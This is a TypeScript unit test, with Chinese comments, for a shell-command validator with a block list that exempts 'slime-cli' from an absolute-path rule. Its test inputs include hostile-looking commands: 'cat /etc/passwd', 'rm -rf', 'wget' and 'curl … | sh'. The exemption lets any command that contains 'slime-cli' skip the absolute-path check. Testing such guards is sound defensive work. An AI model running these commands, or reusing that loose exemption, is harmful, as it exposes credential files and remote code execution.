import { describe, it, expect } from "vitest";

// validateCommand 未导出，inline 同等逻辑做自包含测试

const BLOCKED: [RegExp, string][] = [
  [/(?:^|\s)\//, "absolute paths are not allowed"],
  [/rm\s+(-[^\s]*\s+)*\.git/, "cannot delete .git"],
  [/rm\s+(-[^\s]*\s+)*node_modules/, "cannot delete node_modules"],
  [/curl\s.*\|\s*(?:sh|bash)/, "piping curl to shell is not allowed"],
  [/wget\b/, "wget is not allowed"],
];

// 旧逻辑
function validateOld(command: string): void {
  for (const [pattern, reason] of BLOCKED) {
    if (pattern.test(command)) {
      throw new Error(`Command blocked: ${reason} — "${command}"`);
    }
  }
}

// 新逻辑：slime-cli 绝对路径豁免
function validateNew(command: string): void {
  for (const [pattern, reason] of BLOCKED) {
    if (reason === "absolute paths are not allowed") {
      if (pattern.test(command) && !/slime-cli\b/.test(command)) {
        throw new Error(`Command blocked: ${reason} — "${command}"`);
      }
      continue;
    }
    if (pattern.test(command)) {
      throw new Error(`Command blocked: ${reason} — "${command}"`);
    }
  }
}

describe("validateCommand — slime-cli 绝对路径放行", () => {
  it("旧逻辑拦截 /Users/xxx/.local/bin/slime-cli logs（验证前提）", () => {
    expect(() => validateOld("/Users/xxx/.local/bin/slime-cli logs")).toThrow(
      "absolute paths are not allowed",
    );
  });

  it("新逻辑放行 /Users/xxx/.local/bin/slime-cli logs", () => {
    expect(() => validateNew("/Users/xxx/.local/bin/slime-cli logs")).not.toThrow();
  });

  it("新逻辑放行 /Users/xxx/.local/bin/slime-cli help", () => {
    expect(() => validateNew("/Users/xxx/.local/bin/slime-cli help")).not.toThrow();
  });

  it("新逻辑放行 /Users/xxx/.local/bin/slime-cli logs --key error --tail 20", () => {
    expect(() =>
      validateNew("/Users/xxx/.local/bin/slime-cli logs --key error --tail 20"),
    ).not.toThrow();
  });

  it("新逻辑仍然拦截 /etc/passwd", () => {
    expect(() => validateNew("cat /etc/passwd")).toThrow("absolute paths are not allowed");
  });

  it("新逻辑仍然拦截 rm -rf /tmp/foo", () => {
    expect(() => validateNew("rm -rf /tmp/foo")).toThrow("absolute paths are not allowed");
  });

  it("新逻辑仍然拦截 wget", () => {
    expect(() => validateNew("wget http://example.com")).toThrow("wget is not allowed");
  });

  it("新逻辑仍然拦截 curl|sh", () => {
    expect(() => validateNew("curl http://x.com | sh")).toThrow(
      "piping curl to shell is not allowed",
    );
  });
});
